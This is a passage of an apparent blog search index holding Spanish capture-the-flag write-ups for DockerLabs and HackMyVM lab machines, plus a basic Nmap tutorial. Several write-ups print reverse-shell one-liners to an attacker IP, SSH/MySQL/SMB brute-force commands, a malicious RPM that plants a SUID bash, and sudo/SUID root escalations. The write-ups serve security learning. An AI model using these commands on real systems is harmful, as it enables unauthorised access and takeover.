, bo obstante la gente la ahce de ese modo.Gracias por leer."
  },
  
  {
    "title": "Capypenguin , DOCKERLABS",
    "url": "/posts/capypenguin/",
    "categories": "DockerLabs",
    "tags": "cft, hacking, etico",
    "date": "2024-04-25 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sist...",
    "content": "Este es un reto clasificado como de dificultad facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , revisar la web y su codigo , fuerza bruta contra mysql , revisar las bbdd y escaladaHERRAMIENTAS Y RECURSOS USADOS  nmap  ncrack-searchbinsEnumeracionComo al arrancar la maquina ya nos dice la ip , nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv  172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el ssh 22, el http 80, y el 3306 de mysql.Empecemos por revisar la web no se pq motivo a mi me carga de forma incorrecta y leyendo el codigo veo lo siguiente (eso tambien deberia de verse de forma visual o eso creo).Como se entiende a la perfecion creo que no hace falta explicarlo tenemos al usuario capybarauser y la pass en el final del rockyou  Ademas nos tira un comando a usarYo me voy a llevar las ultimas 100000 lineas del rockyou par empezar con la fuerza bruta y si no seran  1000000 , porque este que tengo lo destripe un par de veces y la cage.tail --lines 100000 ../../../rockyou.txt &gt; 1000.txtAhora ya con el mini rock podemos empezar el ataque , si el usuario lo hubiese extraido de otro lugar haria fuerza bruta tanto a ssh como a mysql pero nos lo ha dado la web asi que vamos primero contra mysql.OJO PARECE QUE SE BLOQUEA LA BASE DE DATOSncrack -u capybarauser -P Maquinas_hack/Dockerlabs.es/capypenguin/1000.txt 172.17.0.2:3306 mysqlInfiltraciónLlego la hora de mandarnos a la base de datos.mysql -h 172.17.0.2 -u capybarauser -pListamos las bases de datosSHOW DATABASES;Le indicamos cual queremos cargar y tambien que nos la muestreUSE pinguinasio_db;SHOW TABLES;Y por ultimo y para visualizar el contenido de la tabla ejecutamosSELECT * FROM users;Ya tenemos un usario y contraseña a probar sshEscalada de privilegiosUna vez dentro listamos directorios importantes y tambien lo primero es ejecutar como de costumbre find y sudo que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lSudo nos arroja el binario nano disponible para escalar hasta root.Lo buscamos en searchbins para saber como ejecutarlo y nos hacemos rootNano no se lleva bienLo soluciono cambiando de terminalGracias por leer"
  },
  
  {
    "title": "Nmap basico bien explicado",
    "url": "/posts/Nmap_basico/",
    "categories": "Software",
    "tags": "herramientas",
    "date": "2024-04-25 00:00:00 -0300",
    





    
    "snippet": "Para comenzar, es esencial familiarizarse con algunos comandos básicos de Nmap. A continuación, se presenta una breve descripción de algunos de los más utilizados:nmap -A &lt;objetivo&gt;: Realiza ...",
    "content": "Para comenzar, es esencial familiarizarse con algunos comandos básicos de Nmap. A continuación, se presenta una breve descripción de algunos de los más utilizados:nmap -A &lt;objetivo&gt;: Realiza un escaneo completo del objetivo especificado, incluyendo la detección del sistema operativo, la detección de servicios y la detección de versiones.nmap -p &lt;rango_de_puertos&gt; &lt;objetivo&gt;: Escanea un rango específico de puertos en el objetivo indicado.nmap -sT &lt;objetivo&gt;: Realiza un escaneo TCP SYN, útil para identificar hosts activos.nmap -sU &lt;objetivo&gt;: Realiza un escaneo UDP, útil para identificar hosts que ejecutan servicios UDP.nmap -v &lt;objetivo&gt;: Aumenta el nivel de verbosidad de la salida.Ejemplos de usoPara ilustrar el uso de Nmap, consideremos algunos ejemplos prácticos:Escaneo completo de un host:nmap -A 192.168.1.100Escaneo de un rango de puertos:nmap -p 1-1000 192.168.1.0/24Escaneo TCP SYN:nmap -sT 192.168.1.0/24Escaneo UDP:nmap -sU 192.168.1.0/24Escaneo detallado con verbosidad alta:nmap -v 192.168.1.100Uso de scriptsNmap ofrece la posibilidad de ampliar sus funcionalidades mediante la utilización de scripts. Estos scripts permiten realizar tareas específicas, como la detección de vulnerabilidades o la identificación de software instalado. Para utilizar scripts, es necesario contar con la biblioteca Nmap Scripting Engine (NSE).ConclusiónNmap se posiciona como una herramienta fundamental para la exploración de redes y la auditoría de seguridad en entornos Linux. Su amplia gama de comandos y la posibilidad de utilizar scripts la convierten en un recurso invaluable para profesionales de la informática y la seguridad. La comprensión de los conceptos básicos de Nmap y su aplicación práctica permiten obtener información crucial sobre la infraestructura de red y detectar posibles vulnerabilidades.Recursos adicionalesPágina oficial de Nmap: https://nmap.org/downloadDocumentación de Nmap: https://nmap.org/docs.htmlTutoriales de Nmap: https://www.freecodecamp.org/news/what-is-nmap-and-how-to-use-it-a-tutorial-for-the-greatest-scanning-tool-of-all-time/"
  },
  
  {
    "title": "Upload , DOCKERLABS",
    "url": "/posts/upload/",
    "categories": "DockerLabs",
    "tags": "cft, hacking, etico",
    "date": "2024-04-23 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad muy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al ...",
    "content": "Este es un reto clasificado como de dificultad muy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , subir webshell , reverse shell y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  webshell  searchbinsEnumeracionComo al arrancar la maquina ya nos dice la ip , nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el 80.Empecemos por revisar la web y nos encontramos directamente con una web de subida de archivos y tratamos de subir una webshell.Como vemos hemos podido subir el fichero .php raro que no estuviese filtrado de algun modo , ahora hemos de averiguar como podemos ejecutarlo para ello tendremos que saber el nombre del directorio donde se subio. Yo hoy voy a probar dirsearch pues no todos los programoas tienen los mismos tipos de escaneos u opciones , de paso aprendemos a manejar otros programas.sudo dirsearch -u http://172.17.0.2 -e php,html,txt -w /usr/share/dirbuster/directory-list-2.3-medium.txtInfiltraciónAhora que ya tenemos todo listo es decir , hemos subido el php malicioso y sabemos donde se ha almacedado pasamos a conectarnos a la web para poder mandarnos una revshell.Pononemos netcat como de costumbre antes de nadaEscalada de privilegiosUna vez dentro listamos directorios importantes y tambien lo primero es ejecutar como de costumbre find y sudo que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lSudo nos arroja el binario env disponible para escalar hasta root.Lo buscamos en searchbins para saber como ejecutarlo y nos hacemos rootGracias por leer"
  },
  
  {
    "title": "Vacaciones , DOCKERLABS",
    "url": "/posts/vacaciones/",
    "categories": "DockerLabs",
    "tags": "cft, hacking, etico",
    "date": "2024-04-22 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada...",
    "content": "Este es un reto clasificado como de dificultad easymuy facil de la plataforma Dockerlabs.Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , explotacion de ssh por fuerza bruta , movimiento lateral entre usuarios y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  hydra  searchbinsEnumeracionComo al arrancar la maquina ya nos dice la ip , nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el 22 y el 80 abiertos .Empecemos por revisar la web y nos encontramos con una web totalmente en blanco asi que directos a ver la fuente.Empezamos por un ataque de fuerza bruta contra el usario camilo porque contra camilo pq entiendo que el receptor del mail es un usario seguro de la maquina.hydra -l camilo -P rockyou.txt -vV 172.17.02 sshInfiltraciónAhora que ya tenemos todo listo pasamos a conectarnos a la maquina con el usario y la contraseña proporcionada por hydra.Escalada de privilegiosUna vez dentro listamos directorios importantes y tambien lo primero es ejecutar como de costumbre find y sudo que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lComo vemos ninguno de los dos comandos nos arroja luz pero recordemos lo que tenemos hasta ahora la web y los users y la web nos hablaba de juan y un correo a camilo.Momento de buscar el mail.cat /var/mail/camilo.txtAhi tenemos en texto plano la pass de juan , accedamossu juanUna vez como juan volvemos a usar sudo y find y esta vez tenemos positivo con ruby.sudo -lPobre pedro no pasamos por su cuenta , no nos va a dar acceso o si ya eres root.Gracias por leer"
  },
  
  {
    "title": "Trust , DOCKERLABS",
    "url": "/posts/trust/",
    "categories": "DockerLabs",
    "tags": "cft, hacking, etico",
    "date": "2024-04-22 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al s...",
    "content": "Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , explotacion de ssh por fuerza bruta y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  hydra      Enumeracion  Como al arrancar la maquina ya nos dice la ip nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oX puertosReporteObservamos el resultado y vemos que solo tiene el 22 y el 80 abiertos .Empecemos por revisar la web en el puerto que indica y nos encontramos con una web en la que bien claro nos da un posible usuario.Empezamos por un ataque de fuerza bruta contra el usario mario haciendo uso de hydra dado que es mucho mas rapido que nxc.hydra -l mario -P rockyou.txt -vV 172.17.02 sshInfiltraciónAhora que ya tenemos todo listo pasamos a conectarnos a la maquina con el usario y la contraseña proporcionada por hydra.Escalada de privilegiosUna vez dentro listamos lo primero es ejecutar como de costumbre que nos buscaran ficheros con permisos erroneos.find / -perm -4000 2&gt;/dev/nullsudo -lEl primer comando nos indica que podemos usar sudo así que comprobamos que es lo que nos permite ejecutar con la magia de sudo -l.Como vemos tenemos el procesdor de texto vim que podemos usar como superusuario .Asi que lanzamos el comando final para ser root.Si no recordamos el comando cosultamos GTOFBINS o usuamos la herramienta searchbins que encontrareis en github.sudo vim -c '!/bin/bash'Hasta aqui la maquina trustGracias por leer"
  },
  
  {
    "title": "Domain , DOCKERLABS",
    "url": "/posts/domain/",
    "categories": "DockerLabs",
    "tags": "cft, hacking, etico",
    "date": "2024-04-21 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al s...",
    "content": "Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , explotacion de samba , subir archivos por samba , envio de revshell y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  enum4linux  netexec  smbmap  smbclientEnumeracionComo al arrancar la maquina ya nos dice la ip nos olvidamos de arp-scan , comprobamos la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -n -sV -sC -Pn 172.17.0.2 -oX domain.xmlReporteObservamos el resultado y vemos que solo tiene el 80 , el 139 y 445 abiertos .Despues de revisar la web no encuentro nada asi que tendremos que enumerar samba y intentar extraer los usuarios.Puedes usar herramientas como enum4linux , smbmap , rpclient , metasploit …Vamos a hacer uso de enum4linux el cual nos devuelve datos interesantes , los cuales nos sirven para avanzar como son los recursos compartidos y los usuarios.Ahora probamos a hacer fuerza bruta contra samba dado que conocemos los usuarios hay muchas herrainetas para esto yo me decanto por netexec.Ejecutamos.sudo nxc smb 172.17.0.2 --ignore-pw-decoding -u bob -p /home/quino/rockyou.txty obtenemos la passwordUna vez con la password ejecutamos smbmap para corroborar si hay permisos de escritura en algun directoriosmbmap -u bob -p star -H 172.17.0.InfiltraciónAhora que ya tenemos todo listo pasamos a conectarnos a la maquina para intentar colar un archivo e intentar ejecutarlo desde la web dado que la carperta de samba es la raiz wwwPara ello utilizare smbclient indicandole el directorio que antes vimos que bob puede escribirsmbclient //172.17.0.2/html -U bobUna vez dentro listamos los archivos y efectivamente encontramos el index.html .Asi que vamos a subir una webshell para reenviarnos un revshell.Accedemos a al php que hemos subido y ejecutamos una revshell , para ello antes nos ponemos en escucha con netcat.Atacantesudo nc -lvnp 443En la webshellbash -c \"bash -i  &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1\"Resultado :Escalada de privilegiosComo siempre empezaremos por lo mas basico buscando ficheros con permisos erroneos scripts con suid gid….En este caso con find tenemos suertefind / -perm -4000 2&gt;/dev/nullComo vemos tenemos el procesdor de texto nano que podemos usar como superusuario asi que solo debemos editar el fichero que creamos mas conveniente para acceder al sitema.El mas rapido y sencillo es editar /etc/passwd y eliminar la x de la linea root de ese moso no se nos pide contraseña cuando hacemos:su rootHasta aqui la maquina domain.Gracias por leer"
  },
  
  {
    "title": "Pyred , DOCKERLABS",
    "url": "/posts/pyred/",
    "categories": "DockerLabs",
    "tags": "cft, hacking, etico",
    "date": "2024-04-19 00:00:00 -0300",
    





    
    "snippet": "Este es un reto clasificado como de dificultad medium en la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al...",
    "content": "Este es un reto clasificado como de dificultad medium en la plataforma dockerlabs.es .Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , envio de revshell y escalada de privelegios.HERRAMIENTAS Y RECURSOS USADOS  nmap  Python  Sudo  fpm  https://blog.ikuamike.io/posts/2021/package_managers_privesc/#method-1-creating-a-malicious-rpm-packageEmpezamosComo al arrancar la maquina ya nos dice la ip nos olvidamos de arp-scan , como comprobar la conexion con un ping.ping -c1 172.17.0.2Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.sudo nmap -p- -sSVC -n -Pn -A -vvv 172.17.0.2Observamos el resultado y vemos que solo tiene el puerto 5000 abierto , por lo tanto la entrada esta en esa web asi que vamos a revisarla.El codigo fuente no muestra nada pero por lo que parece es un shell interactivo de python , asi que probamos a ejecutar comandos.print(\"loco\")InfiltraciónComo hemos comprobado si que ejecuta, así que intentamos mandarnos una revshell.Para ello antes de ejecutar la rev nos colocamos a la escucha en la maquina atacante.sudo nc -lvnp 443y en la victima ejecutamos:import osos.system(\"bash -c bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1\")Ya tenemos la revshell y podemos trabajar directamente en el objetivo y pasamos a escalar privilegios.Escalada de privilegiosComo siempre empezaremos por lo mas basico buscando ficheros con permisos erroneos scripts con suid.find / -perm -4000 2&gt;/dev/nullsudo -lEl comando find no devuelve nada aprovechable de momento , pero sudo nos da la idea de como atacar puesto que el usuario primpi puede ejecutar dnf que es un gestor de paquetes de fedora.Podemos usar gtfobins para averiguar como explotar esa vulnerabilidad.Yo tengo instalado searchbins y ejecuto , donde  -b es el binario al que tenemos acceso y -f indica la funcion que utilizaremos para acceder al binario./searchbins.sh -b dnf -f sudoEl searchbins me devuelve lo siguiente:It runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.Descargamos e instalamos la herramienta para crear el rpm.TF=$(mktemp -d)echo 'id' &gt; $TF/x.shfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TFDebemos crear un  rpm malicioso en nuestra maquina atacante , lo cual lo podemos hacer con los comandos anteriores y una vez lo tengamos subirlo a la maquina victima e instalarlo.Usaremos los siguientes comandos.En maquina atacante :python3 -m http.serverY el la victima :curl -O http://ipatacante/rpmcreadosudo dnf install -y rpmcreado.rpmYo personalmente no acabo de entender que es lo que hacen exactamente esos comandos así que busque otra forma de hacerlo que fuera mas entendible para mi , así que hice lo siguiente.mkdir exploit_rpmCreo un script en el directorio creado anteriormente con el siguiente contenido.#!/bin/bashcp /bin/bash /tmp/bashchmod +xs /tmp/bashUna vez creado el script hago uso de la herramienta fpm que hemos instalado anteriormente , yo al ser usuario de arch no tengo instalado rpmbuild asi que me lance un VM de kali para realizar esa tarea y ejecute :fpm -n exploit -s dir -t rpm --before-install ./exploit/exploit.sh ./exploitCreated package {:path=&gt;\"exploit-1.0-1.x86_64.rpm\"}Ahora que ya lo tenemos creado solo tendremos que enviarlo a la maquina objetivo y instalarlo y ejecutarlo como explique antes el ultimo comando que utilizo para ser root es :/tmp/bash -pComo observamos ya estamos como superuser.Hasta aqui llegamos , un saliudo y gracias por leer."
  },
  
  {
    "title": "Alzheimer, HACKMYVM",
    "url": "/posts/alzheimer/",
    "categories": "HackMyVm",
    "tags": "",
    "date": "2023-11-27 00:00:00 -0300",
    





    
    "snippet": "En esta maquina encontramos scan , port knoking ,  escalada de privilegios. Como siempre vamos a empezar por localizar la maquina victima y realizar un scan de puertos.Herramientas y recursos web u...",
    "content": "En esta maquina encontramos scan , port knoking ,  escalada de privilegios. Como siempre vamos a empezar por localizar la maquina victima y realizar un scan de puertos.Herramientas y recursos web utilizados  arp-scan  nmap  gtofbinsEscaneoEmpezamos averiguando la ip de la maquina victima para ello ejecutamos la herramienta arp-scan nos fijamos en el resultado y buscamos la mac que empieza por 08:00 esa mac es de virtualbox.arp-scan -lnmap -A -n $ipvictimaComo podemos observar nos muestra tres puertos el 22 y el 80 estan filtrados y el 21 abierto , así que de momento vamos al ftp ya que permite login anonimo.ftp $ipvictimaUna vez dentro de la ftp vemos que encontramos un archivo interensante y oculto.Vemos su contenido y anotamos las indicaciones asi como el mensaje repetido que es algo raro.” Ihavebeenalwayshere!!! “Nos dice que hay que hacer port knocking  en los puertos especificados , para ello instalamos knock si no lo tenemos lo instalamos y procedemos ha hacer lo que nos indica en los puertos indicados.El firewall abrira los puertos  ,  por lo general cuando se golpean los puertos de determinada manera se desactivan los filtros.knock 192.168.0.101 1000 2000 3000 -v -d 1000En el primer golpeo ya nos abre el 80 ahora falta el 22 asi que seguimos con knocking que lo abre a la tercera llamada.Una vez tengo todos los puerto abiertos me voy a chusmear la web.Vemos que contiene un mensaje firmado por medusa que puede ser usuario ya podriamos tirar con hidra y el rockyou , aunque si analizamos lo que dice es que la pass esta en un txt  y el unico txt hasta el momento era el .secretnote.txt y aparate de las instruciones venia un frase.Directo a sshssh medusa@192.168.0.101ESCALADA DE PRIVILEGIOSPerfecto estamos ya en el usuario.Yo personalmente uso kitty como terminal y me da algunos errores como clear  , tab , etc…. asi que ejecuto :export TERM=xtermEl resto no me molesta asi que tiro para adelanteUna vez dentro como siempre haremos lo mas básico buscar con sudo -l  o binarios suidEl comando sudo -l nos arroja un /bin/id con esa informacion me acerco a gtofbins y no me arroja nada bueno y no tengo de lejos el nivel para averiguar por mi mismo si ese binario serviria para escalar .Ahora toca el plan B del para ello usamos findfind /  -perm /4000 2&gt;/dev/nullDel listado que vemos tambien podriamos usar mount para escalar si este estuviera para ser ejecutado a traves de sudo , el binario en cuestion que usaremos en esta prueba es /usr/bin/capsh vamos a gtofbins para ver como se hace.  Si el binario tiene el bit de SUID establecido, no deja caer los privilegios elevados y puede ser abusado para acceder al sistema de archivos, escalar o mantener el acceso privilegiado como una puerta trasera SUID. Si se usa para correr sh -p, omit the -pargumento en sistemas como Debian (o= Stretch) que permiten el valor predeterminado shpara correr con privilegios SUID.Este ejemplo crea una copia local SUID del binario y la dirige para mantener privilegios elevados. Para interactuar con un binario SUID existente omita el primer comando y ejecutar el programa usando su ruta original.    sudo install -m =xs $(which capsh) .        ./capsh --gid=0 --uid=0 --Una vez ejecutado ya somo root y podemos dedicarmos a buscar las flags o lo que te interese.Muchas gracias por leer."
  },
  
  {
    "title": "Hidden, HACKMYVM",
    "url": "/posts/hidden/",
    "categories": "HackMyVm",
    "tags": "",
    "date": "2023-11-26 00:00:00 -0300",
    





    
    "snippet": "En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shellHerramientas y software utilizado  arp-scan  nmap  gobuster , wfuzz  sudo  python3 http.server  ncrackU...",
    "content": "En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shellHerramientas y software utilizado  arp-scan  nmap  gobuster , wfuzz  sudo  python3 http.server  ncrackUna vez encontrada la maquina realizamos un scan de puertos con nmapComo vemos en este caso solo tenemos el puerto 22 y el 80 asi que primero vamos a ver la web y su codigo fuente.En la web nos encontramos  con una imagen con un codigo extraño y su nombre indica que lo decodifiquemos y mas abajo en un comentario nos indica que ese codigo usa un formato concreto.Nos vamos a la siguiente web https://www.dcode.fr/tic-tac-toe-cipher y buscamos la codificacion correcta para nuestro codigo para poder obtener algo legible.  ¿Cuál es la diferencia entre codificar y cifrar?Los códigos por lo general operan sobre la semántica, significados, mientras que los cifrados operan sobre la sintaxis, símbolos. Un código se almacena como un mapeo en un libro de códigos, mientras que los cifrados transforman símbolos individuales de acuerdo con un algoritmo.Una vez localizado y decodeado lo añadimos a /etc/hosts vamos a la web de nuevo a ver que hay.Como vemos no hay nada util asi que toca hacer fuzzing contra la ruta añadida en etc/hosts para buscar directorios y archivos ocultos.gobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://sys.hidden.hmv --exclude-length 3690Como vemos nos muestra tres directorios ocultos dos de ellos son para distraernos y uno de ellos nos devuelve una web en blanco.Vamos a hacer fuzzing de nuevo contra ese otro directorio para ver si esconde algo mas.gobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://sys.hidden.hmv/weapon --exclude-length 3690Nos encuentra un archivo con nombre loot.php al que tenemos acceso pero nos devuelve una web en blanco , me hace pensar que hay una webshell , pero nos faltan datos para hacer uso de ella si es que existe .Esta vez neceitamos encontrar la carga que falta para poder ejecutar comandos y vamos a hacer uso de otro fuzzer en este caso wfuzz para ver si encuentra la carga util que nos faltaria.  Las webshell siempre tienen este fomato:htttp:direccion/archivo.php?loquesea=comandoAl menos por lo que he visto hasta la fecha pero imagino que pueden crearse con otro lenguaje.wfuzz -c -w /usr/share/dirb/wordlists/big.txt  -u http://sys.hidden.hmv/weapon/loot.php\\?FUZZ\\=ls --hw 0Como vemos en la imagen y despues de varias pruebas con otros fuzzers encontro la palabrita que nos da paso a la ejecucion de comandos remota , es momento de mandarnos una reverseshell.Para ello podemos buscar en internet hay varias paginas que te la crean yo uso la siguiente https://www.revshells.com/.Lo primero es poner nuestra maquina a la escucha:nc -lvpn 9001Despues en la webshell ejecutamos:sh -i &gt;&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1Este intento no me conecto ni encodeando la url acto seguido hago lo mismo pero llamando a nc directamente.nc 20192.168.0.112 9001 -e shCon este segundo metodo tampoco me conectaba como esperaba pueden ver el error en la imagen de abajo al igual que la conexion exitosa cuando cambie el sh por un /bin/bash quedando el comando de la siguiente manera.nc 20192.168.0.112 9001 -e /bin/bashSpanw de shellpython3 -c 'import pty;pty.spawn(\"/bin/bash\")'Aqui podemos ver el fichero que creo para verificar que la carga util era la palabra hack que por lo general usan cmd , exec , etc….Ahora como siempre lo primero sera un sudo -l o permisos suid con find para algun binario o script personal.Al hacer un ls sobre el home vemos que hay dos usuario toreto y atenea y el usuario toreto puede ejcutar perl con permisos sudo . Vamos a gtofbins para ver como se hace y poder acceder al sistema de ficheros de toreto conservando sus privilegios.  Recordar que sois www-data hay que indicarle a sudo con el usuario que quereis ejecutar sudo.sudo -u toreto perl -e 'exec \"/bin/bash\" ;'El usuario toreto no tiene nada interesante revisamos el user atenea y encontramos una carpeta oculta con un diccionario de claves , debemos descargarlo y lanzar cualquier software que permita ataque por diccionario.Para ello levanto un servicio web con python en el directoriopython3 -m http.serverDescargamos el diccionario y lanzamos en mi caso ncrackncrack -p 22 --user atenea -P atenea.txt 192.168.0.101Nos logueamos por ssh con el user y la pass y empezmos la escala final como antes con sudo -l.Consultamos gtofbins para ver como se hace la escala con socat.Para variar no olviden buscar las flagsMuchas gracias por leer."
  },
  
  {
    "title": "Twisted, HACKMYVM",
    "url": "/posts/twisted/",
    "categories": "HackMyVm",
    "tags": "",
    "date": "2023-11-25 00:00:00 -0300",
    





    
    "snippet": "En esta maquina encontaremos escaneo  , esteganoigrafia y lectura de binarioHerramientas y recursos utilizados:  arp-scan  nmap  stegseek  https://morsecode.world/international/decoder/audio-decode...",
    "content": "En esta maquina encontaremos escaneo  , esteganoigrafia y lectura de binarioHerramientas y recursos utilizados:  arp-scan  nmap  stegseek  https://morsecode.world/international/decoder/audio-decoder-adaptive.html  radare2  https://reverseengineering.stackexchange.com/questions/15193/radare2-c-output  https://reverseengineering.stackexchange.com/questions/15244/how-to-use-radare2-to-disassemble-an-executable-fileScanUna vez localizada la maquina de la victima realizamos lanzamos a nuestro amigo nmap.Como podemos ver nos encontramos con el puerto 80 y con el servicio ssh corriendo por el puerto 2222.Empezamos como siempre por lo facil observando tanto la web como su codigo fuente , el codigo fuente no tiene nada especial solo nos indica que prefiere la imagen de abajo y como a simple vista son iguales vamos a analizar las dos imagenes.EsteganografiaPrimero le paso exiftool sin exito asi que probamos de nuevo con stegseek el cual nos devuelve un txt.stegseek cat-original.jpg ../../../Descargas/rockyou.txt/rockyou.txtstegseek cat-hidden.jpg ../../../Descargas/rockyou.txt/rockyou.txtTambien estamos atentos a los nombres de los txt originales que nos devuelve stegseek.Yo hago  login con con el user mateo , en su home hay un .wav que es una trampa y perdida de tiempo el mismo nos lo dice.”CON HUMOR”Escalada de privilegiosPara esta parte como de costumbre en estos retos sencillos que me llevan un tiempo ejecutamos:sudo -lfind / -perm /4000 2&gt;/dev/nullCon find vemos que que existe un archivo llamado beroot con suid pero no consigo llegar a ese archivo , tambien hay otra note.txt en el directorio de markus el cual tampoco leer , lo que me lleva pensar que con este usuario estoy en un agujero de conejo por completo.Vuelvo hacia atras para intentar hacer login con markus.Tengo exito con markus y consigo leer el txt que indica lo siguiente clave id_rsa guardada en ….La copiamos a nuestra maquina cambiamos a 600 los permisos y conectamos con ssh al user bonita.ssh -i id_rsa  bonita@192.168.0.108 -p 2222Ejecutamos el binario y nos da error , aqui busque un manual de la maquina para ver que hacer porque ni puta idea en algun walktrough te ponen el codigo que se necesita pero hay que hacerlo por uno mismo con copy paste no aprendes y como he visto que  todos hacen uso de ghidra “NSA” me decante por radare2 pese a no tener ni idea de como usarlo.El que quiera ver porno , subir tik toks y demas adormecimientos que lo haga es libre, pero internet es la puta biblioteca de Alejandria y pocas cosas hay que no se puedan encontrar y aprender.Levantamos un servidor http con python3  y descargamos el fichero.python3 -m http.serverNos abrimos radare2 y ejecutamos lo siguiente:  s main  que nos llevara a la funcion principal que todo programa en c tienepd   que nos mostrara el codigo decompiladobuscamos la parte donde espera un input  “scanf” en c o buscamos la cadena de texto que nos muestra cuando lo ejecutamos cerca de esa parte esta el valor que buscamos.Obvio que hay maneras de hacer que sea mas legible pero repito es mi primera vez y no encontre la forma de hacerlo mas legible como lo hacen los que usan ghidra.La funcion cmp compara el valor introducido con el que esta escrito dentro de esa funcion.Ahora solo nos queda ir a alguna web a convertir el hexadecimal en decimal para obtener el codigo de beroot que nos dara acceso a root.INFO RADARE2  [0x00005430]&gt; pd?|Usage: p[dD][ajbrfils] [sz] [arch] [bits] # Print Disassembly| NOTE: len  parameter can be negative| NOTE:      Pressing ENTER on empty command will repeat last pd command and also seek to end of disassembled range.| pd N       disassemble N instructions| pd -N      disassemble N instructions backward| pD N       disassemble N bytes| pda        disassemble all possible opcodes (byte per byte)| pdb        disassemble basic block| pdc        pseudo disassembler output in C-like syntax| pdC        show comments found in N instructions| pdk        disassemble all methods of a class| pdj        disassemble to json| pdr        recursive disassemble across the function graph| pdf        disassemble function| pdi        like ‘pi’, with offset and bytes| pdl        show instruction sizes| pds[?]     disassemble summary (strings, calls, jumps, refs) (see pdsf and pdfs)| pdt        disassemble the debugger traces (see atd)  The pc command will output n bytes from the current seek (s) as a C array, where n is the Block size (b) or the length mentioned in the command.The output is then can be used to, for example, manipulate the array outside of radare2, build a shellcode, decrypt a buffer and so on.Let’s demonstrate it with a simple example.Here’s a tiny HelloWorld.c program:```c#include  void main(){        printf(“Hello, World!\\n”);}&gt;Let's compile it with `gcc HelloWorld.c -o HelloWorld` and open it with radare2 `r2 -A HelloWorld`Now let's seek to `main` and print the function:```c[0x00400400]&gt; s main[0x004004d7]&gt; pdf            ;-- main:/ (fcn) sym.main 17|  sym.main ();|           ; DATA XREF from 0x0040041d (entry0)|       0x004004d7      55             push rbp|       0x004004d8      4889e5         mov rbp, rsp|       0x004004db      bf74054000     mov edi, str.Hello__World_ ; \"Hello, World!\"|       0x004004e0      e80bffffff     call sym.imp.puts          ; int puts(const char *s)|       0x004004e5      90             nop|       0x004004e6      5d             pop rbp\\       0x004004e7      c3             retDe facil para mi nada esta maquina pero aprenderemos los principios para decompilar y saltarnos la seguridad de algun software.Benditos agujeros de conejo y no soy Alicia en el pais de las maravillas, pese a las complicaciones muy recomendada esta maquina y divertida si no sabes mucho y te gusta romperte los cuernos dale a esta.GRACIAS POR LEER… ACUERDENSE DE LAS FLAGS"
  },
  
  {
    "title": "Method, HACKMYVM",
    "url": "/posts/method/",
